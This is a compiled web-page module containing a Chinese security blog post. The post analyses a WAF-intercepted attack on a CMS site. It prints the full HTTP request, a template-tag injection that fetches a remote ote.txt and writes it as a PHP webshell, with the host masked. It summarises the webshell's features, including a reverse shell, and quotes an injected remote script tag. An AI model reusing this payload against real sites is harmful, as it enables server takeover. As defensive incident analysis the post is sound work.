import{_ as a}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as n,a as e,o as i}from"./app-BiQR_lPj.js";const l={};function t(p,s){return i(),n("div",null,s[0]||(s[0]=[e(`<h1 id="记一次网站防护功能" tabindex="-1"><a class="header-anchor" href="#记一次网站防护功能"><span>记一次网站防护功能</span></a></h1><p>最近在waf后台上看到这个，于是好奇来分析一下</p><p>部分字符使用XX代替。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>GET /?tag&amp;tagstpl=news.html&amp;tag=%7Bpbohome/Indexot:if((get/*-*/(/**/t))/**/(get/*-*/(/**/t1),get/*-*/(/**/t2)(get/*-*/(/**/t3))))%7Dok%7B/pbohome/Indexot:if%7D&amp;t=file_put_contents&amp;t1=runtime/complile/003.php&amp;t2=file_get_contents&amp;t3=http://XXXXXXXXXXX.cn/app/index/taglib/ote.txt HTTP/1.1</span></span>
<span class="line"><span>user-agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</span></span>
<span class="line"><span>eagleeye-traceid: a3b5239717551577503652798e</span></span>
<span class="line"><span>ali-swift-log-host: m.XX.com</span></span>
<span class="line"><span>ali-cdn-real-ip: 103.XX.XX.144</span></span>
<span class="line"><span>x-forwarded-for: 103.XX.XX.144</span></span>
<span class="line"><span>content-type: application/x-www-form-urlencoded</span></span>
<span class="line"><span>ali-cdn-forward-client-ip: 103.XX.XX.144</span></span>
<span class="line"><span>ali-swift-stat-host: m.XX.com</span></span>
<span class="line"><span>accept-encoding: gzip, deflate</span></span>
<span class="line"><span>host: m.XX.com</span></span>
<span class="line"><span>accept: */*</span></span>
<span class="line"><span>x-client-scheme: http</span></span>
<span class="line"><span>via: hk34.l1, ens-cache10.hk34, l2hk12.l2, ens-cache35.l2hk12</span></span>
<span class="line"><span>waf-intercept-client-ip-port: 103.XX.XX.144:40895</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="https://imgoss.xgss.net/picgo-tx2025/QQ_1755161620891.png?tx" alt="img"></p><p>于是在浏览器访问，获取到了一些PHP代码。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>http://XXXXXXXXXXX.cn/app/index/taglib/ote.txt</span></span>
<span class="line"><span>打开这个首页是一个企业站，应该是这个企业站被挂马了。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="https://imgoss.xgss.net/picgo-tx2025/image-20250814165558987.png?tx" alt="image-20250814165558987"></p><h2 id="丢个chatgpt分析一下代码ote-txt" tabindex="-1"><a class="header-anchor" href="#丢个chatgpt分析一下代码ote-txt"><span>丢个ChatGPT分析一下代码ote.txt</span></a></h2><h2 id="攻击目的" tabindex="-1"><a class="header-anchor" href="#攻击目的"><span>攻击目的</span></a></h2><p>这是标准的远程文件写入 + WebShell 植入手法：</p><p>利用 CMS 模板解析执行任意 PHP 函数（file_put_contents + file_get_contents）。</p><p>把攻击者控制的 PHP 代码写到本地一个可访问位置。</p><p>后续可以通过访问 runtime/complile/003.php 来远程执行命令，完全控制服务器。</p><p>模板最终执行效果等价于：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>file_put_contents(</span></span>
<span class="line"><span>    &#39;runtime/XXX/003.php&#39;,</span></span>
<span class="line"><span>    file_get_contents(&#39;http://XXXXXXXXXXX.cn/XXX/XX/taglib/ote.txt&#39;)</span></span>
<span class="line"><span>);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="部署方式" tabindex="-1"><a class="header-anchor" href="#部署方式"><span><strong>部署方式</strong>：</span></a></h3><ul><li>攻击者通过漏洞（如你之前提到的模板标签 RCE）下载并保存 <code>ote.txt</code> 到服务器</li><li>再利用解析漏洞或改名方式让 <code>.txt</code> 被当作 PHP 执行</li></ul><h3 id="功能模块-常见于-oteteam-大马" tabindex="-1"><a class="header-anchor" href="#功能模块-常见于-oteteam-大马"><span><strong>功能模块</strong>（常见于 OteTeam 大马）：</span></a></h3><ol><li>文件管理（浏览、上传、下载、删除、修改权限）</li><li>数据库管理（执行 SQL、导入导出）</li><li>命令执行（直接运行系统命令）</li><li>连接反弹（反弹 Shell 到攻击者主机）</li><li>插件扩展（加载更多恶意模块）</li></ol><h3 id="输出恶意标签" tabindex="-1"><a class="header-anchor" href="#输出恶意标签"><span>输出恶意标签</span></a></h3><p>尾部</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>$str=&quot;XXXXXX&quot;;</span></span>
<span class="line"><span>echo base64_decode($str);</span></span>
<span class="line"><span>解码后为：</span></span>
<span class="line"><span></span></span>
<span class="line"><span>html</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;sCripT sRC=//XXXXXXXX&gt;&lt;/sCrIpT&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这会在页面中加载远程 JS（可能进行二次攻击或窃取信息）。</p>`,24)]))}const r=a(l,[["render",t]]),h=JSON.parse('{"path":"/safe/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BD%91%E7%AB%99%E9%98%B2%E6%8A%A4%E5%8A%9F%E8%83%BD.html","title":"记一次网站防护功能","lang":"en-US","frontmatter":{},"git":{"createdTime":1755655357000,"updatedTime":1755655357000,"contributors":[{"name":"star","username":"star","email":"star@xgss.net","commits":1,"url":"https://github.com/star"}]},"readingTime":{"minutes":1.63,"words":489},"filePathRelative":"safe/记一次网站防护功能.md"}');export{r as comp,h as data};
